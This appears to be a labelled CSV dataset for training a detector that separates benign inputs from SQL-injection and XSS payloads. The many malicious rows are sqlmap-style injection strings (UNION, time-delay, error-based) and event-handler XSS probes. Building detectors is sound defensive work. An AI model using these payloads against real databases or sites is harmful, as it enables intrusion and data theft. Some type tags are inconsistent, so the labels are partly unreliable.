Text,Label,type
-2504'   )    )     )   or 8723  =  9715,1,sql
09069193v,0,sql
borrenes,0,sql
"   SELECT memory, guard, hungry FROM feathers WHERE deer  IS NULL",0,sql
SELECT AVG ( coming ) FROM frame SELECT SUM ( test ) ,0,sql
"<img onmouseup=""alert(1)"">test</img>",2,xss
"SELECT * FROM mother WHERE information BETWEEN ""found"" AND    ""water""",0,sql
<svg><thead onload=alert(1)></thead>,2,xss
SELECT high FROM sweet,0,sql
-4215  )   where 5782  =  5782 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,sql
SELECT * FROM exciting WHERE region IN  ( SELECT stuck FROM appropriate ) ,0,xss
"-5700 where 4238  =  4238 union all select 4238,4238,4238#",1,sql
7.11566E+15,0,xss
	 </span> </h3>,0,xss
SELECT indicate FROM western UNION SELECT shelf FROM accurate ORDER BY warm,0,xss
1   )    )    or sleep  (  __TIME__  )  #,1,xss
SELECT option_value FROM wp_options WHERE option_name  =  'options_middle_button_link' LIMIT 1,0,sql
57879425v,0,xss
"c/ moncayo, 36, 10-d",0,sql
1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'napi' like 'napi,1,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Related </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
"1'   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   'rbhe'  =  'rbhe",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
orea,0,xss
1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv,1,sql
<menu onpointerleave=alert(1)>XSS</menu>,2,xss
"<a href=""/wiki/John_McCarthy_(computer_scientist)"" title=""John McCarthy (computer scientist)"">McCarthy </a> and AI research at <a href=""/wiki/Stanford_Artificial_Intelligence_Laboratory"" class=""mw-redirect"" title=""Stanford Artificial Intelligence Laboratory"">SAIL </a> and <a href=""/wiki/SRI_International"" title=""SRI International"">SRI International </a>:",0,xss
"1""  )   where 9020  =  9020 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,sql
	 </span> 2018 ,0,xss
de tena leguizamn,0,sql
vilagut victori,0,sql
"<div onbeforepaste=""alert(1)"" contenteditable>test</div>",2,xss
testing.</p>,0,xss
"INSERT INTO creature ( finest, tin, till, fort, pilot, term )  VALUES  ( 'cup', 'were'. tone', 'yard', 'creature', 'sick', 'till' )  ",0,sql
"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,sql
clodettes_pierson@repretexbcn.ml,0,sql
SELECT TOP 3 * FROM tax WHERE aboard = 'gulf' SELECT * FROM skin,0,sql
"	 </span> <span class=""reference-text"">A. J. Robinson and F. Fallside. The utility driven dynamic error propagation network. Technical Report CUED/F-INFENG/TR.1, Cambridge University Engineering Department, 1987. ",0,xss
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367578 ) ,0,sql
"  SELECT rich AS involved, seems AS [win]  FROM eye",0,sql
SELECT * FROM sink WHERE create = 'important',0,sql
FROM  ( SELECT DISTINCT trunk FROM courage ) ,0,sql
"-8060""  )   where 5290  =  5290 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1,xss
"<li><a href=""/wiki/History_of_evolutionary_thought"" title=""History of evolutionary thought"">History of evolutionary thought </a> </li>",0,xss
"INSERT INTO Customers  ( CustomerName, ContactName, Address, City, PostalCode, Country )  VALUES  ( 'Cardinal', 'Tom B. Erichsen', 'Skagen 21', 'Stavanger', '4006', 'Norway' ) ; ",0,sql
"-6095""   )    )    as kgfp where 3601  =  3601 or 7287  =  9373#",1,sql
"  SELECT weighID AS ID, repeat AS thought FROM office",0,sql
"   SELECT find,stick,maybe,never,fix     (  (  fat JOIN program ON now.interest =  community.shut )   INNER JOIN planningON Orders.gone =  cookies.riseID ) ",0,sql
florescu,0,sql
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""uidb"" like ""uidb",1,sql
SELECT TOP 3 * FROM clearly WHERE enjoy = 'capital',0,xss
"<ul oncontextmenu=""alert(1)"">test</ul>",2,xss
 </li>,0,xss
"1   )    )    as wufr where 5239  =  5239 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"INSERT INTO town  ( continued, order, would )  VALUES  ( 'sell', 'cake', 'industrial' )  ",0,sql
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1,sql
1   )    )    as zoso where 3633  =  3633,1,xss
to_timestamp_tz,1,sql
belonne santaella,0,sql
"=""javascript:alert('')",2,xss
i2cit6d4r,0,sql
"<area onmousemove=""alert(1)"">test</area>",2,xss
SELECT * FROM shirt  WHERE occasionally NOT LIKE '[clothing]%',0,xss
-8080'   )    )    order by 1#,1,xss
"<ul><li><a href=""/wiki/Remotely_operated_underwater_vehicle"" title=""Remotely operated underwater vehicle"">remotely-operated </a> </li> </ul> </li> </ul>",0,xss
<style onpointerup=alert(1)>XSS</style>,2,xss
79533872x,0,xss
	 </span>,0,xss
"<summary onkeypress=""alert(1)"" contenteditable>test</summary>",2,xss
46183,0,sql
soulef,0,sql
"<li id=""cite_note-Expert_systems-41""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Expert_systems_41-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Expert_systems_41-1""><sup><i><b>b </b> </i> </sup> </a> ",0,xss
6.49002E+15,0,sql
 </ul>,0,xss
"1%""  )   union all select null,null,null,null,null#",1,sql
kavid,0,sql
"<svg onbeforepaste=""alert(1)"" contenteditable>test</svg>",2,xss
 ,0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"iif  (  3760  =  4785,1,1/0  )  ",1,sql
inescourt7@citycvs.mil,0,sql
"<hr onbeforecut=""alert(1)"" contenteditable>test</hr>",2,xss
"1   )    )    as khvx where 7533  =  7533 union all select null,null,null,null,null,null,null,null--",1,xss
"	<th style=""padding:0.1em""><a href=""/wiki/Artificial_intelligence#Goals"" title=""Artificial intelligence"">Major goals </a> </th> </tr><tr><td class=""plainlist"" style=""padding:0 0.1em 0.4em"">",0,xss
SELECT RADIANS ( 180 ) ;,0,sql
SELECT MIN ( symbol )  AS while FROM hurried,0,sql
"<main onkeyup=""alert(1)"" contenteditable>test</main>",2,xss
"<body draggable=""true"" ondragstart=""alert(1)"">test</body>",2,xss
"<ul><li><a href=""/wiki/Natural_language_processing"" title=""Natural language processing"">Natural language processing </a> </li>",0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"1""  )   as cxwd where 5800  =  5800 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'medg'  =  'medg",1,sql
select case when 8975  =  2352 then 1 else null end--,1,xss
1' and sleep  (  5  )   and 'kapr'  =  'kapr,1,sql
"<style>@keyframes slidein {}</style><kbd style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></kbd>",2,xss
SELECT TOP 3 * FROM syllable WHERE beyond = 'fireplace',0,sql
Symbolic vs. sub-symbolic AI:,0,xss
<small onpointermove=alert(1)>XSS</small>,2,xss
<shadow onblur=alert(1) tabindex=1 id=x></shadow><input autofocus>,2,xss
"<ul><li><a href=""/wiki/Artificial_development"" title=""Artificial development"">Artificial development </a> </li>",0,xss
" select * from users where id  =  1 or 1#""; union select version  (    )  ,version  (    )   -- 1",1,sql
SELECT AVG ( perhaps )  FROM deal  SELECT SUM ( somehow ) ,0,sql
select case when 2095  =  9074 then 1 else null end--,1,sql
<mark id=x tabindex=1 onbeforeactivate=alert(1)></mark>,2,xss
"  SELECT * FROM fat WHERE practice IN  ( 'fifteen', 'wall', 'ear' )  ",0,sql
SELECT * FROM dozen  WHERE clearly NOT LIKE '[frozen]%',0,sql
SELECT COUNT ( mind ) FROM except,0,sql
"  SELECT worry AS your, floating AS [thee]  FROM muscle",0,sql
-6453%'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   '%'  =  ',1,sql
c/ oblit 76,0,sql
47131,0,xss
SELECT TOP 3 * FROM depend WHERE piano = 'best',0,sql
"<td oncopy=""alert(1)"" contenteditable>test</td>",2,xss
"	 </span> <span class=""reference-text""><a href=""#CITEREFRussellNorvig2009"">Russell &amp; Norvig 2009 </a>, p.&#160;16. ",0,xss
"1'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'acly' like 'acly",1,sql
"<abbr draggable=""true"" ondragleave=""alert(1)"">test</abbr>",2,xss
"<video onclick=""alert(1)"">test</video>",2,xss
SELECT * FROM orange FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
ech5d7,0,xss
ozoa cadaveira,0,sql
SELECT * FROM origin WHERE sudden = 'least'  OR least = 'solid',0,sql
</div>,0,xss
paolo,0,sql
SELECT * FROM outline  WHERE simplest NOT LIKE '[hill]%',0,sql
"	 </span> <span class=""reference-text"">",0,xss
SELECT DISTINCT cannot FROM feature,0,sql
end and   (  'hmtt' like 'hmtt,1,xss
SELECT base ( s )  FROM is UNION ALL,0,sql
elvian,0,xss
-7746'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'itxy' like 'itxy,1,sql
"1 where 1186  =  1186 union all select null,null,null,null,null,null,null#",1,sql
SELECT * FROM nervous WHERE broke = 'repeat' FETCH FIRST 3 ROWS ONLY,0,xss
SELECT * FROM type  WHERE cow NOT LIKE '[rocky]%',0,sql
"<b oncopy=""alert(1)"" contenteditable>test</b>",2,xss
SELECT Count ( * )  AS problem,0,sql
"INSERT INTO escape  ( pattern, partly, speech )  VALUES  ( 'tent', 'available', 'yourself' )  ",0,xss
"-4919  )   union all select 2608,2608,2608,2608,2608,2608#",1,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
"<frameset onmouseup=""alert(1)"">test</frameset>",2,xss
g66uin2,0,sql
" select * from users where id  =  '1' or \<$ union select 1,@@VERSION -- 1'",1,sql
1   )    )     )   union all select null#,1,sql
"<plaintext onmousedown=""alert(1)"">test</plaintext>",2,xss
"1""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""ynde""  =  ""ynde",1,sql
"-2190'  )   where 8890  =  8890 union all select 8890,8890#",1,sql
select case when 5433  =  6458 then 1 else null end--,1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
<nextid onpointerdown=alert(1)>XSS</nextid>,2,xss
select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,1,xss
"<var oncopy=""alert(1)"" contenteditable>test</var>",2,xss
SELECT COUNT ( DISTINCT question )  FROM properly,0,xss
equiparable,0,sql
"<title draggable=""true"" ondragend=""alert(1)"">test</title>",2,xss
1'  )   where 5491  =  5491 and 9198  =  9198--,1,sql
spinnell@cpanelweb.com.ao,0,sql
<custom tags onpointerenter=alert(1)>XSS</custom tags>,2,xss
"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",1,sql
SELECT * FROM circus WHERE Price NOT BETWEEN 10 AND 20,0,sql
DELETE FROM colony,0,sql
 </ul>,0,xss
"   SELECT ants, farther, opposite FROM lack WHERE college  IS NULL",0,xss
	 </span>(1921) </li>,0,xss
"<style>@keyframes slidein {}</style><button style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></button>",2,xss
cabrillas,0,xss
SELECT * FROM Customers  WHERE Country = 'Germany'  AND City = 'Berlin';,0,xss
c39ine8ra,0,sql
1'   )    )    as plbt where 4368  =  4368 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,xss
"1""   )    )    as dshc where 9911  =  9911 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"1'  )   as woka where 4316  =  4316 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,xss
"<li id=""cite_note-FOOTNOTEDomingos2015chapter_6-212""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos2015chapter_6_212-0"">^ </a> </b> ",0,xss
select case when 1613  =  2937 then 1 else null end--,1,sql
SELECT MIN ( book )  AS noted FROM person,0,sql
bascuana de san pedro,0,xss
SELECT * FROM half WHERE push = 'eventually'  OR fill = 'onto',0,sql
"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'zpyx'  =  'zpyx",1,sql
portelan9,0,xss
"<li><a href=""/wiki/Genetic_programming"" title=""Genetic programming"">Genetic programming </a> </li>",0,xss
"-5524  )   as eoyk where 6928  =  6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",1,sql
" SELECT column_name ( s )  FROM father,wide",0,xss
"1' and elt  (  4249  =  4249,7259  )   and 'nsbj' like 'nsbj",1,xss
"1'  )   where 8255  =  8255 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,xss
romer@pisossantcugat.iq,0,sql
"1""   )    )    as kmss where 3214  =  3214 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
" SELECT column_name ( s )  FROM began,whatever",0,sql
SELECT various ( s )  FROM article LEFT JOIN,0,sql
SELECT TOP 3 * FROM copy WHERE out = 'cheese',0,sql
"1  )   where 4226  =  4226 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,sql
tyler,0,xss
	 </span></a></dt><dd>See all available exceptions and their meaning.</dd>,0,xss
SELECT COUNT ( him ) FROM doing,0,sql
SELECT COUNT ( bone )  FROM power,0,sql
SELECT TOP 3 * FROM Customers;  SELECT * FROM CustomersLIMIT 3;SELECT * FROM Customers,0,sql
select case when 8237  =  9948 then 1 else null end--,1,xss
"1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'abcf' like 'abcf",1,sql
"<ul><li><a href=""/wiki/Ethics_of_artificial_intelligence"" title=""Ethics of artificial intelligence"">Ethics </a> </li>",0,xss
"  SELECT strong,degree FROM shut WHERE specific = 'chest' UNION SELECT gun, traffic FROM won",0,sql
<center onfocusout=alert(1) tabindex=1 id=x></center><input autofocus>,2,xss
"<tfoot draggable=""true"" ondragleave=""alert(1)"">test</tfoot>",2,xss
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 4.2, </li>",0,xss
"<sup id=""cite_ref-FOOTNOTERussellNorvig2009_7-1"" class=""reference""><a href=""#cite_note-FOOTNOTERussellNorvig2009-7"">&#91;7&#93; </a> </sup> Some argue that some kind of (currently-undiscovered) conceptually straightforward, but mathematically difficult, ""Master Algorithm"" could lead to AGI.",0,xss
"<li><a href=""/wiki/Multi-agent_system"" title=""Multi-agent system"">Multi-agent system </a> </li>",0,xss
SELECT * FROM police WHERE frame = 'fifty'  AND  ( plain = 'noise' OR court = 'should' ) ,0,sql
<style id=x tabindex=1 onfocusin=alert(1)></style>,2,xss
"1'+  (  select 'rryx' where 1228  =  1228 union all select null,null,null,null,null,null,null,null,null#",1,sql
"    <link rel=""search"" title=""Search"" href=""search.html"" />",0,xss
"  SELECT sillyID AS ID, darkness AS depend FROM basis",0,sql
"1'+  (  select 'lawc' where 1171  =  1171 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
SELECT * FROM stretch FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM phrase,0,sql
"1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",1,sql
" SELECT Orders.OrderID, Customers.CustomerName, Shippers.ShipperName FROM   (  (  Orders INNER JOIN Customers ON Orders.CustomerID  =  Customers.CustomerID )   INNER JOIN Shippers ON Orders.ShipperID  =  Shippers.ShipperID ) ;",0,sql
SELECT * FROM map  WHERE depth = leather,0,sql
"<small onmouseleave=""alert(1)"">test</small>",2,xss
5.88668E+15,0,sql
"	 <div class=""plainlinks hlist navbar mini""><ul><li class=""nv-view""><a href=""/wiki/Template:Evolutionary_computation"" title=""Template:Evolutionary computation""><abbr title=""View this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">v </abbr> </a> </li><li class=""nv-talk""><a href=""/wiki/Template_talk:Evolutionary_computation"" title=""Template talk:Evolutionary computation""><abbr title=""Discuss this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">t </abbr> </a> </li><li class=""nv-edit""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=Template:Evolutionary_computation&amp;action=edit""><abbr title=""Edit this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">e </abbr> </a> </li> </ul> </div>",0,xss
1%'   )    )    order by 1--,1,sql
"1',  (  select   (  case when   (  3888  =  3888  )   then   (  select count  (  *  )   from generate_series  (  1,5000000   )    )    else 1/  (  select 0  )   end   )    )   ",1,xss
SELECT option_value FROM wp_options WHERE option_name  =  'houzez_settings' LIMIT 1,0,sql
"<li><a href=""/wiki/Identity_(philosophy)"" title=""Identity (philosophy)"">Identity </a> </li>",0,xss
        <dt>On Read the Docs</dt>,0,xss
"<h3><span class=""mw-headline"" id=""Hospitality"">Hospitality ",0,xss
	 </span> </li>,0,xss
SELECT * FROM  ( SELECT running FROM possibly ) ,0,sql
proftica,0,sql
SELECT * FROM metal FETCH FIRST 3 ROWS ONLY,0,sql
<iframe onpointerup=alert(1)>XSS</iframe>,2,xss
"	 <div id=""Links_to_related_articles"" style=""font-size:114%;margin:0 4em"">Links to related articles </div> </th> </tr><tr><td colspan=""2"" class=""navbox-list navbox-odd"" style=""width:100%;padding:0px;font-size:114%"">",0,xss
<b onpointermove=alert(1)>XSS</b>,2,xss
SELECT * FROM invented WHERE raise BETWEEN band09/01/1996small AND people15/31/1996cross,0,sql
filis,0,sql
%7C,1,sql
	 </span>,0,xss
SELECT * FROM giant FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM sure,0,xss
"1'||  (  select 'mjkz' where 9430  =  9430   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users   )    )   ||'",1,sql
<samp onpointerout=alert(1)>XSS</samp>,2,xss
"<xmp onbeforecopy=""alert(1)"" contenteditable>test</xmp>",2,xss
"<time onmouseleave=""alert(1)"">test</time>",2,xss
1'||  (  select 'gved' from dual where 6965  =  6965,1,sql
flo3a,0,xss
"SELECT ID, post_name, post_parent, post_type FROM wp_posts WHERE post_name IN  ( 'our-family' )  AND post_type IN  ( 'page','attachment' ) ",0,sql
"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""hhwy""  =  ""hhwy",1,xss
"<u onmouseover=""alert(1)"">test</u>",2,xss
"<i onkeypress=""alert(1)"" contenteditable>test</i>",2,xss
SELECT * FROM trap FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"<li><a href=""/wiki/Pseudoscience"" title=""Pseudoscience"">Pseudoscience </a> </li>",0,xss
SELECT * FROM classroom WHERE    NOT lonely = 'work',0,xss
1  )   as msat where 1267  =  1267,1,xss
"-5288'  )   or make_set  (  1164  =  1710,1710  )   and   (  'pkwy'  =  'pkwy",1,sql
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main articles: <a href=""/wiki/Search_algorithm"" title=""Search algorithm"">Search algorithm </a>, <a href=""/wiki/Mathematical_optimization"" title=""Mathematical optimization"">Mathematical optimization </a>, and <a href=""/wiki/Evolutionary_computation"" title=""Evolutionary computation"">Evolutionary computation </a> </div>",0,xss
SELECT * FROM she 3 SELECT * FROM further,0,sql
"1'  )   as hvyx where 3194  =  3194 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
"1 where 2823  =  2823 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
SELECT * FROM slightly FETCH FIRST 3 ROWS ONLY,0,sql
"<xmp onbeforecut=""alert(1)"" contenteditable>test</xmp>",2,xss
"<slot draggable=""true"" ondrag=""alert(1)"">test</slot>",2,xss
SELECT * FROM sky WHERE being BETWEEN spell09/01/1996throat AND fish15/31/1996unless,0,sql
SELECT * FROM college WHERE thing = 'lake'  AND City = 'spider',0,sql
"-9779'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'hmzj'  =  'hmzj",1,sql
alysia,0,sql
g53on3a9u56,0,sql
"INSERT INTO my ( beneath, clock, worth, cannot, how, bear )  VALUES  ( 'flame', 'knew'. save', 'opinion', 'smoke', 'satisfied', 'model' )  ",0,sql
bilal,0,sql
"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""hcjz"" like ""hcjz",1,sql
"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",1,sql
"  SELECT Orders.hellorID, Employees.usual, Employees.reader FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.serviceID ORDER BY Orders.fightingID",0,sql
-5250  )   where 1591  =  1591 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,sql
"   SELECT Employees.oldest, COUNT ( Orders.wholeID )  AS raceFROM    ( OrdersINNER JOIN close ON Orders.chanceID  =  Employees.scaleID ) ",0,xss
"-9183""  )   as wctu where 2058  =  2058 or 3038  =  3038",1,sql
SELECT * FROM have WHERE unless BETWEEN '1996-07-01' AND '1996-07-31',0,sql
1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,1,sql
"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 27990 )  ORDER BY meta_id ASC",0,sql
nagaraja,0,sql
" SELECT * FROM missing ORDER BY string, along",0,sql
23,0,sql
"<colgroup draggable=""true"" ondragleave=""alert(1)"">test</colgroup>",2,xss
2008,0,sql
"  SELECT until,bill FROM chamber WHERE system = 'voice' UNION SELECT only, pay FROM battle",0,sql
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1,sql
-1021  )   as erjh where 7845  =  7845 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,sql
<input autofocus onfocusin=alert(1)>,2,xss
"1   )    )    as oywa where 7951  =  7951 union all select null,null,null,null,null,null#",1,sql
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.ID IN  ( 28074 )  AND wp_posts.post_type  =  'nav_menu_item' AND   (  (  wp_posts.post_status  =  'publish'  )  )   ORDER BY wp_posts.menu_order ASC,0,xss
SELECT * FROM want WHERE field LIKE '%farther%',0,xss
 </li>,0,xss
